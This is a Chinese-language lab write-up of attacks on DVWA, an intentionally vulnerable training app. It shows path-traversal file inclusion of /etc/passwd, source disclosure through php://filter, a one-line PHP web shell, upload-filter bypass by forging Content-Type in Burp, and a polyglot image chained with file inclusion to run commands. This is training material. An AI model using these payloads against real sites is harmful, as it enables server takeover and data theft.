#DVWA文件包含与文件上传实战记录
##目标
1.读取服务器任意文件
2.上传恶意脚本并控制服务器
##第一部分————文件包含
###1.原理：后台未对用户输入的'page'参数进行过滤，直接使用了'include()'函数，攻击者可以通过路径穿越（'../'）包含本地敏感文件
###2.利用：
  **读取系统文件**：修改URL参数'?page=../../../../../../../etc/passwd',成功利用linux系统用户列表
  **读取源码**：尝试直接拼接'config.inc.php'时页面空白，采用伪协议，使用'php://filter',将payload构造为 '?page=php://filter/convert.base64-encode/resource=/etc/dvwa/config/config.inc.php'成功。
  base64.us网站解码，拿到内容
##第二部分————文件上传
###LOW级别：无防护
  直接上传'shell.php'(<?php system($_GET['cmd']);?>).
  访问'/dvwa/hackable/uploads/shell.php?cmd=whoami',成功返回'www-data'
###MWDIUM级别：只允许上传JPEG/PNG格式文件
**采用抓包改包**：用BP拦截请求，将'Content-Type:'后的内容改为'image/jpeg',绕过检测
###第三部分————采用图片马 
**制作图片马**：1.制作一个PHP文件（echo "<?php system(\$_GET['cmd']);?>">shell.php）
               2.制作一个图片（convert -size 200x200 xc:white test.jpg）
              3.利用 Linux 命令 `cat test.jpg shell.php > polyglot.jpg` 将代码拼接到合法图片尾部，伪装成合法的 JPEG。
**🚨 权限排错**：Firefox 以普通用户运行，无法打开 `/root` 目录读取文件。将文件复制到公共目录 `/tmp/`（`cp /root/polyglot.jpg /tmp/ && chmod 755 /tmp/polyglot.jpg`），解决文件读取问题。
**组合拳利用**：单纯的 `.jpg` 无法被 Apache 解析。联合文件包含漏洞，访问：
  `?page=../../hackable/uploads/polyglot.jpg&cmd=whoami`
  （⚠️ **排错记录**：URL 里不小心多写了一个 `&polyglot.jpg`，导致 `cmd` 参数失效，删掉多余参数后成功）。
**终极姿势**：将图片马直接重命名为 `polyglot.php`，再用 Burp 伪造 `Content-Type: image/jpeg` 上传。直接访问 `/uploads/polyglot.php?cmd=whoami`，在图片二进制乱码中成功提取 `www-data`。
